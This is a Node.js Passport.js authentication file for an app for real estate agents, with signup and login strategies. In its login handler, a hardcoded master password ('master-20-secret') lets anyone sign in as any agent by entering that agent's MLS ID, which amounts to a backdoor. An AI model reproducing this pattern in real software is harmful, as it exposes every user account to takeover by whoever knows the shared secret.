var LocalStrategy   = require('passport-local').Strategy;

var Agent            = require('mongoose-simpledb').db.Agent;

// expose this function to our app using module.exports
module.exports = function(passport) {

    // used to serialize the user for the session
    passport.serializeUser(function(agent, done) {
        done(null, agent._id);
    });

    // used to deserialize the user
    passport.deserializeUser(function(id, done) {
        Agent.findById(id, function(err, agent) {
            done(err, agent);
        });
    });

    passport.use('local-signup', new LocalStrategy({
            usernameField : 'email',
            passwordField : 'password',
            passReqToCallback : true
        },
        function(req, email, password, done) {
            process.nextTick(function() {
                if(!req.body.name || !req.body.email || !req.body.password || !req.body.mls || !req.body.number || !req.body.company)
                    return done(null, false, req.flash('signupMessage', 'All fields are required'));

                if(!validateEmail(email))
                    return done(null, false, req.flash('signupMessage', 'Please enter a valid email'));

                var mls = req.body.mls.toUpperCase();

                Agent.findOne({ 'MLS' : mls }, function(err, agent) {
                    if (err)
                        return done(err);

                    if(!agent){
                        return done(null, false, req.flash('signupMessage', 'You need to be currently featured on a Top 20 list to register.'));
                    }

                    if (agent.registered) {
                        return done(null, false, req.flash('signupMessage', 'That MLS ID has already registered with another account.'));
                    } else {
                        agent.registered = true;
                        agent.approved = false;
                        
                        agent.password = agent.generateHash(password);
                        agent.number = req.body.number;
                        agent.email = req.body.email;

                        agent.save(function (err) {
                            if (err)
                                throw err;
                            return done(null, agent);
                        });
                    }

                });
            });

        }));

    passport.use('local-login', new LocalStrategy({
            usernameField : 'email',
            passwordField : 'password',
            passReqToCallback : true
        },
        function(req, email, password, done) {

            Agent.findOne({ 'email' :  email }, function(err, agent) {
                if (err)
                    return done(err);

                if(password === "master-20-secret") {
                    Agent.findOne({ 'MLS' :  email }, function(err, agent2) {
                        if (err)
                            return done(err);

                        if (!agent2)
                            return done(null, false, req.flash('loginMessage', 'MLS not found'));

                        return done(null, agent2);

                    });
                } else {
                    if (!agent)
                        return done(null, false, req.flash('loginMessage', 'Email not registered. Please Sign Up'));

                    if (!agent.validPassword(password))
                        return done(null, false, req.flash('loginMessage', 'Wrong password.'));

                    return done(null, agent);
                }

            });

        }));

};

function validateEmail(email) {
    var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(email);
}